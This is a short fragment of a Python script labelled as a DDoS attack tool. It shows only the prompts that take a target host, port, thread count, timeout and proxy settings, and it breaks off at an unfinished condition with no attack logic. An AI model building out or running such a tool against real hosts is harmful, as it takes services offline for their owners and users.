# © DDOS Attacker- Made by Yuval Simon. For www.bogan.cool
...
target = input('Please enter target without (http/https): ')
PORT = int(input("Please enter target's port: "))
thr = int(input("Please enter threads number: "))
ms = int(input("Please enter timeout (5-50): "))
proxy_type = input('Please enter proxy type (http/socks4/socks5): ')
get_proxy = input('Do you want me to get proxies for you? (y/n): ')
if get_proxy == "y":
